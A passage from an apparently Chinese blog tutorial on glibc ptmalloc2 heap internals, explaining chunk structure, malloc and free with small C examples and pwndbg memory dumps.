operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>一般来说，size_t 在 <span class="token number">64</span> 位中是 <span class="token number">64</span> 位无符号整数，<span class="token number">32</span> 位中是 <span class="token number">32</span> 位无符号整数。</code></pre><p>字段解释：</p><ul><li><p>prev_size, 如果该 chunk 的物理相邻的前一个chunk是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。</p></li><li><p>size ，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示</p><ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。    </li><li>PREV_INUSE，<strong>记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。</strong>当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><p>fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p><ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><p>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p></li></ul><p>其对应结构：Free chunk<br><img src="https://s1.ax1x.com/2020/09/07/wu38W4.png" alt=""><br>Malloced chunk<br><img src="https://s1.ax1x.com/2020/09/07/wu33YF.png" alt=""></p><p>注意事项:<br><strong>32位或64位分配的到的堆分别要4字节对齐，8字节对齐即他们的大小分别是4和8的倍数。</strong><br>在64位中（同32）又因为chunk头是必须要有的所以会占据16字节大小，所以在64位中malloc最小分配到的chunk大小是16字节。<strong>size字段记录了本chunk的完整大小而，chunk大小一定是8的倍数，所以size最后的三bit位没用会被置零（100=4，1000=8）但是设计者为了极值利用每一点空间就把这三位定义了其数据意义（前文所提到的）但是我们主要抓住最后一位带表的意义：前一个chunk是否是free状态，1代表是malloced状态，0代表free状态</strong></p><h2 id="堆的开辟–malloc"><a href="#堆的开辟–malloc" class="headerlink" title="堆的开辟–malloc"></a>堆的开辟–malloc</h2><p>其实除了malloc函数还有realloc，calloc函数也能开辟堆空间，但我们先了解最常用的malloc<br>malloc函数：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//在使用malloc的时候要进行强制类型转换为指针类型</span></code></pre><p>malloc函数申请地址成功后返回一个指针，指向大小为至少size字节的内存块，结合上面的结构图即<strong>malloced chunk的user_data_start处的地址作为指针返回，其下方用来存放用户数据，空间大于等于malloc所申请的内存（8字节对齐嘛）</strong><br>回到之前我们所提到的：堆管理器’进货‘，在我们执行malloc之前ptmalloc2就会向系统申请一块较大的内存，来让用户多次申请。举个例子：</p><pre class=" language-java"><code class="language-java"><span class="token operator">*</span>RIP  <span class="token function">0x4004f4</span> <span class="token punctuation">(</span>main<span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span>— call   <span class="token number">0x4003f0</span>────────────────────────────────────────────────────────────<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>─────────────────────────────────────────────────────────────   <span class="token number">0x4004ef</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>               mov    edi<span class="token punctuation">,</span> <span class="token number">0x24</span> ► <span class="token number">0x4004f4</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span>              call   malloc<span class="token annotation punctuation">@plt</span> <span class="token operator">&lt;</span>malloc<span class="token annotation punctuation">@plt</span><span class="token operator">></span>        size<span class="token operator">:</span> <span class="token number">0x24</span>   <span class="token number">0x4004f9</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span>              mov    qword ptr <span class="token punctuation">[</span>rbp <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rax   <span class="token number">0x4004fd</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span>              mov    eax<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token number">0x400502</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">27</span><span class="token operator">></span>              leave     <span class="token number">0x400503</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span>              ret       <span class="token number">0x400504</span>                        nop    word ptr cs<span class="token operator">:</span><span class="token punctuation">[</span>rax <span class="token operator">+</span> rax<span class="token punctuation">]</span>   <span class="token number">0x40050e</span>                        nop       <span class="token number">0x400510</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>      push   r15   <span class="token number">0x400512</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">2</span><span class="token operator">></span>    push   r14   <span class="token number">0x400514</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>    mov    r15<span class="token punctuation">,</span> rdx─────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>─────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>test<span class="token punctuation">.</span>c   <span class="token number">1</span> #include<span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span>   <span class="token number">2</span> #include<span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span>   <span class="token number">3</span>    <span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token number">5</span> <span class="token punctuation">{</span> ► <span class="token number">6</span>     <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">7</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">8</span> <span class="token punctuation">}</span>─────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>─────────────────────────</code></pre><p>此时还没执行malloc我们来看看vmmap</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> vmmapLEGEND<span class="token operator">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA          <span class="token number">0x400000</span>           <span class="token number">0x401000</span> r<span class="token operator">-</span>xp     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x600000</span>           <span class="token number">0x601000</span> r<span class="token operator">--</span>p     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x601000</span>           <span class="token number">0x602000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">1000</span>   <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out    <span class="token number">0x7ffff79e4000</span>     <span class="token number">0x7ffff7bcb000</span> r<span class="token operator">-</span>xp   <span class="token number">1e7000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7bcb000</span>     <span class="token number">0x7ffff7dcb000</span> <span class="token operator">--</span><span class="token operator">-</span>p   <span class="token number">200000</span> <span class="token number">1e7000</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcb000</span>     <span class="token number">0x7ffff7dcf000</span> r<span class="token operator">--</span>p     <span class="token number">4000</span> <span class="token number">1e7000</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcf000</span>     <span class="token number">0x7ffff7dd1000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> 1eb000 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dd1000</span>     <span class="token number">0x7ffff7dd5000</span> rw<span class="token operator">-</span>p     <span class="token number">4000</span> <span class="token number">0</span>          <span class="token number">0x7ffff7dd5000</span>     <span class="token number">0x7ffff7dfc000</span> r<span class="token operator">-</span>xp    <span class="token number">27000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7fdc000</span>     <span class="token number">0x7ffff7fde000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> <span class="token number">0</span>          <span class="token number">0x7ffff7ff7000</span>     <span class="token number">0x7ffff7ffa000</span> r<span class="token operator">--</span>p     <span class="token number">3000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>    <span class="token number">0x7ffff7ffa000</span>     <span class="token number">0x7ffff7ffc000</span> r<span class="token operator">-</span>xp     <span class="token number">2000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>    <span class="token number">0x7ffff7ffc000</span>     <span class="token number">0x7ffff7ffd000</span> r<span class="token operator">--</span>p     <span class="token number">1000</span> <span class="token number">27000</span>  <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7ffd000</span>     <span class="token number">0x7ffff7ffe000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">28000</span>  <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7ffe000</span>     <span class="token number">0x7ffff7fff000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">0</span>          <span class="token number">0x7ffffffde000</span>     <span class="token number">0x7ffffffff000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>stack<span class="token punctuation">]</span><span class="token number">0xffffffffff600000</span> <span class="token number">0xffffffffff601000</span> r<span class="token operator">-</span>xp     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span>pwndbg<span class="token operator">></span> </code></pre><p>还没有出现堆，继续执行</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> vmmapLEGEND<span class="token operator">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA          <span class="token number">0x400000</span>           <span class="token number">0x401000</span> r<span class="token operator">-</span>xp     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x600000</span>           <span class="token number">0x601000</span> r<span class="token operator">--</span>p     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x601000</span>           <span class="token number">0x602000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">1000</span>   <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x602000</span>           <span class="token number">0x623000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>                 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>堆空间出现    <span class="token number">0x7ffff79e4000</span>     <span class="token number">0x7ffff7bcb000</span> r<span class="token operator">-</span>xp   <span class="token number">1e7000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7bcb000</span>     <span class="token number">0x7ffff7dcb000</span> <span class="token operator">--</span><span class="token operator">-</span>p   <span class="token number">200000</span> <span class="token number">1e7000</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcb000</span>     <span class="token number">0x7ffff7dcf000</span> r<span class="token operator">--</span>p     <span class="token number">4000</span> <span class="token number">1e7000</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcf000</span>     <span class="token number">0x7ffff7dd1000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> 1eb000 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dd1000</span>     <span class="token number">0x7ffff7dd5000</span> rw<span class="token operator">-</span>p     <span class="token number">4000</span> <span class="token number">0</span>          <span class="token number">0x7ffff7dd5000</span>     <span class="token number">0x7ffff7dfc000</span> r<span class="token operator">-</span>xp    <span class="token number">27000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7fdc000</span>     <span class="token number">0x7ffff7fde000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> <span class="token number">0</span>          <span class="token number">0x7ffff7ff7000</span>     <span class="token number">0x7ffff7ffa000</span> r<span class="token operator">--</span>p     <span class="token number">3000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>    <span class="token number">0x7ffff7ffa000</span>     <span class="token number">0x7ffff7ffc000</span> r<span class="token operator">-</span>xp     <span class="token number">2000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>    <span class="token number">0x7ffff7ffc000</span>     <span class="token number">0x7ffff7ffd000</span> r<span class="token operator">--</span>p     <span class="token number">1000</span> <span class="token number">27000</span>  <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7ffd000</span>     <span class="token number">0x7ffff7ffe000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">28000</span>  <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7ffe000</span>     <span class="token number">0x7ffff7fff000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">0</span>          <span class="token number">0x7ffffffde000</span>     <span class="token number">0x7ffffffff000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>stack<span class="token punctuation">]</span><span class="token number">0xffffffffff600000</span> <span class="token number">0xffffffffff601000</span> r<span class="token operator">-</span>xp     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span></code></pre><p>我们主要到堆空间从0x602000           开始，到0x623000 结束，其整个大小为：132KB</p><pre class=" language-java"><code class="language-java"><span class="token operator">>>></span> <span class="token number">0x623000</span> <span class="token operator">-</span><span class="token number">0x602000</span><span class="token number">135168</span><span class="token operator">>>></span> <span class="token number">135168</span><span class="token operator">/</span><span class="token number">1024</span><span class="token number">132</span><span class="token operator">>>></span> </code></pre><p>这就是ptmalloc2商人的货物，是调用了<strong>brk和sbkr函数</strong>，当需求大于132字节就会调用mmap函数来获取一个更大的堆空间。<br>然后每当有malloc函数来向ptmalloc2申请空间时（在bins中没有符合大小的情况下），商人就会从货物中切一块对应大小的chunk，从低地址往高地址切，切了剩下的叫top chunk，原来的那个货物叫arena，由主线程分配的arena叫做main_arena.<br><img src="https://s1.ax1x.com/2020/09/07/wu31FU.png" alt=""></p><h2 id="堆的释放-free"><a href="#堆的释放-free" class="headerlink" title="堆的释放-free"></a>堆的释放-free</h2><p>用一个简单的例子来理解一下 free 函数的实现原理。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>gdb：</p><pre class=" language-java"><code class="language-java">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c    <span class="token number">3</span>     <span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token number">5</span> <span class="token punctuation">{</span>    <span class="token number">6</span>     <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">7</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ►  <span class="token number">8</span>     <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">9</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">10</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde90</span> —▸ <span class="token number">0x7fffffffdf80</span> ◂— <span class="token number">0x1</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffde98</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token string">'AAAAAAAB\n'</span>   <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>输入的字符<span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│ rbp  <span class="token number">0x7fffffffdea0</span> —▸ <span class="token function">0x400600</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffdea8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffdeb0</span> ◂— <span class="token number">0x1</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffdeb8</span> —▸ <span class="token number">0x7fffffffdf88</span> —▸ <span class="token number">0x7fffffffe2f0</span> ◂— <span class="token string">'/home/matrix/a.out'</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffdec0</span> ◂— <span class="token number">0x1f7ffcca0</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffdec8</span> —▸ <span class="token function">0x4005b6</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— push   rbp────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           <span class="token number">4005e7</span> main<span class="token operator">+</span><span class="token number">49</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602010</span> <span class="token operator">-</span><span class="token number">0x10</span>   <span class="token comment" spellcheck="true">//这里-0x10因为malloc返回的是user_data_start地址 </span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>chunk_head<span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x4241414141414141</span>    <span class="token number">0x000000000000000a</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>user_data<span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020fd1</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>top chunk<span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>可以发现size字段是0x31：<strong>首先size的最后三bit有P位是1，然后我申请了0x24字节，为了对齐ptmalloc2给了我0x20的user_data，0x10的chunk_head，显然这里的0x20不足满足我的0x24需求。但是下面的top chunk,</strong><br><strong>的Prev_size字段无意义（因为前一个chunk是malloced）也可以被上一个malloced chunk使用。所以就不在多分配了。所以我们申请得到chunk 大小位0x30但是可以使用下面top chunk的Prev_size。</strong></p><p>继续执行：</p><pre class=" language-java"><code class="language-java">In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c    <span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token number">5</span> <span class="token punctuation">{</span>    <span class="token number">6</span>     <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">7</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">8</span>     <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> ►  <span class="token number">9</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">10</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde90</span> —▸ <span class="token number">0x7fffffffdf80</span> ◂— <span class="token number">0x1</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffde98</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0x0</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│ rbp  <span class="token number">0x7fffffffdea0</span> —▸ <span class="token function">0x400600</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffdea8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffdeb0</span> ◂— <span class="token number">0x1</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffdeb8</span> —▸ <span class="token number">0x7fffffffdf88</span> —▸ <span class="token number">0x7fffffffe2f0</span> ◂— <span class="token string">'/home/matrix/a.out'</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffdec0</span> ◂— <span class="token number">0x1f7ffcca0</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffdec8</span> —▸ <span class="token function">0x4005b6</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— push   rbp────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           4005f3 main<span class="token operator">+</span><span class="token number">61</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602010-</span><span class="token number">0x10</span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span><span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x000000000000000a</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>前面的数据被清空了<span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602030</span><span 